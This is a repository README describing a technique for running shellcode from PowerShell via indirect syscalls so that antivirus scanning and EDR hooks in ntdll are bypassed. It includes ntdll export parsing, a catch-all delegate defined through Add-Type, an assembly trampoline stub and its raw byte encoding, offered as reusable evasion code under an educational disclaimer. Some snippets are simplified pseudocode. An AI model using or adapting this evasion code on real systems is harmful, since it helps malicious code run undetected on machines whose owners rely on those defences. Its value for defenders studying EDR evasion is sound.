# Indirect Syscalls Via PowerShell

**Antivirus** (AV) & **Endpoint Detection and Response** (EDR) softwares plague almost every machine execution environments.
This means almost no executable code that may deemed malicious will ever make it to execution.
Even if this means execution within PowerShell.
This repository stands as a technical documnetation behind shellcode execution via indirect syscalls.

**Disclaimer**: The purpose of this is for educational purposes and testing only.
Do not use this on machines you do not have permission to use.
Do not use this to leverage and communicate with machines that you do not have authorization to use.

## The problem.

AV will deny anything within a script it may find to be malicious.
Known and guessed bads will be blocked from inclusion before the execution stage.
Known bads like function imports from DLLs, delegate building from function pointers, module parsing via `.GetMethod()`.

```diff
+ PS C:\> # Invoke-Shellcode
- At line:1 char:1
- + # Invoke-Shellcode
- + ~~~~~~~~~~~~~~~~~~
- This script contains malicious content and has been blocked by your antivirus software.
-    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
-    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

EDRs will hook into **Dynamically Linked Libraries** like `ntdll.dll` in order to inspect parameters before system calls.
The hook looks like a jump before the syscall to another function so parameters can be seen.
If possible malicious shellcode is included to a parameter, the binary will get flagged as malicious and will not reach execution.

```x86-asm
!ntdll.NtCreateThreadEx:
        MOV     R10,    RCX
        MOV     EAX,    0xC9
        JMP     !EDR.Inspection
        SYSCALL
        RET
```

## The solution.

Every process is loaded with `ntdll.dll`.
Functions needed for execution already come with the loaded process.
The module can be parsed to find necessary functions used to execute shellcode.

If we setup a manual stubbing function, we can ignore the original stub and jump directly to our system call.
With every function, apply the **System Service Number** needed, as well as the relative **Syscall Instruction Address**.
We can call these custom stubs as a function and it will behave as normal while also evading userland hooks.

### Export parsing.

For export parsing, the ultimate fallback will be manual.
For delegate definitions, 1 type fits all.
Following Windows ABI calling convention is forgiving, as extra arguments are harmless to the scope of execution.

Export information in a DLL is standard. 
The export directory has 4 critical fields.
Each field contains the offset (location within the DLL) where that information is located.
Each location iterates in intervals to the size of the object (RVA Slot, Address, etc.)
Find the exported names at a current index.
If the name is desired, the same index returns the RVA slot.
The slot will return the address location of the desired function.

```PowerShell
$pDllBase             = [Diagnostics.Process]::GetCurrentProcess().Modules.BaseAddress
$NumberOfNames        = $pDllBase.e_lfanew.ExportDirectory.NumberOfNames
$AddressOfFunctions   = $pDllBase.e_lfanew.ExportDirectory.AddressOfFunctions
$AddressOfNames       = $pDllBase.e_lfanew.ExportDirectory.AddressOfNames
$NumberOfNameOrdinals = $pDllBase.e_lfanew.ExportDirectory.NumberOfNameOrdinals
```

### Delegate builds.

Delegate building can be simplified into one type.
To reiterate, the Windows API has a standard calling convention.
Extra arguments will not be used, or even seen, as the function being called does not expect additional arguments.
Upon return, the caller is responsible for stack cleaning of original arguments.
With this being said, we can create a custom runtime type that follows this standard.

```PowerShell
Add-Type @"
using System;
using System.Runtime.InteropServices;

[UnmanagedFunctionPointer(CallingConvention.Winapi)]
public delegate IntPtr pFrankenstub(
        IntPtr Arg1,
        IntPtr Arg2,
        IntPtr Arg3,
        ...
);
"@
```

### Indirect syscalls.

All methods of AMSI evasion discussed still apply.
Modern EDRs will provide userland hooks to inspect arguments before a syscall.
These hooks are within the syscall stub themselves.
The syscall stub instructions still must be executed before the syscall.


```x86-asm
REAL_SYSCALL_STUB:
        ...
        MOV     R10,    RCX
        MOV     EAX,    0xXXXX 0000
        ...
        SYSCALL
        RET
```

We can silently indirect syscall if a trampoline is provided.
Perform the syscall stub instructions ourselves; jump to the exact syscall instruction address.

On a tangent, the most simple way I could think of jumping to a syscall is with a relative jump.
This means the address will be stored on the stack temporarily before a syscall.
Where the address is placed is in the free stack space used for the callee.

```x86-asm
FRANKEN_STUB:
        MOV     RAX,    QWORD   [SYSCALL_ADDRESS]
        MOV     QWORD   [RSP + 0x08],     RAX
        MOV     R10,    RCX
        MOV     EAX,    DWORD   [SYSTEM_SERVICE_NUMBER]
        JMP     QWORD   [RSP + 0x08]
```

```PowerShell
$FrankenStub = [byte[]] @(
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x48, 0x89, 0x44, 0x24, 0x08,
        0x49, 0x89, 0xCA,
        0xB8, 0x00, 0x00, 0x00, 0x00, 
        0xFF, 0x64, 0x24, 0x08
);
```

Mapping executable memory is not possible natively available in PowerShell.
Leverage 1 indirect funcall, we can create silent indirect syscalls.
Derive the necessary function to page executable memory, then use it to create indirect syscalls.